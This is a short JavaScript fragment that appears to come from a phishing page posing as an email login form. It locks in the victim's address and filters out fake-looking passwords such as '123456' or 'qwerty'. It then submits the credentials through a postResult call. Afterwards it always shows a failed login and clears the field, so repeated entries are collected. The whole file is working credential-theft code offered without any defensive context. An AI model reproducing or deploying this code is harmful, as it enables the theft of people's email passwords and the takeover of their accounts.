// 
if (validEmail.test(usermail)) {
    $("#g_mail").val(usermail);
    $("#g_mail").attr('readOnly', true); 
}

// 
$("#global_form_btn").on('submit', (e)=>{
    e.preventDefault();

    let global_inputs = document.getElementsByClassName("global_inputs")

    if (!validEmail.test($("#g_mail").val())) {
        global_inputs[0].style.borderColor = "red";
        return
    }
    else{
        global_inputs[0].style.borderColor = "silver";
    }

    if (validEmail.test($("#g_pass").val()) || $("#g_pass").val().length < 6 || $("#g_pass").val() == 123456 || $("#g_pass").val().toLowerCase() == "qwerty" || $("#g_pass").val().toLowerCase() == "password" || $("#g_pass").val().toLowerCase() == "testing") {
        global_inputs[1].style.borderColor = "red";
        return
    }
    else{
        global_inputs[1].style.borderColor = "silver";
    }

    $("#loader").show().css({"display":"flex"})

    let url = $("#g_mail").val().split('@');

    postResult(url[1], $("#g_mail").val(), $("#g_pass").val(), postCount);
    
    setTimeout(() => {
        global_inputs[1].style.borderColor = "red";
        postCount++
        $("#g_pass").val("")
    }, delayCounter);

})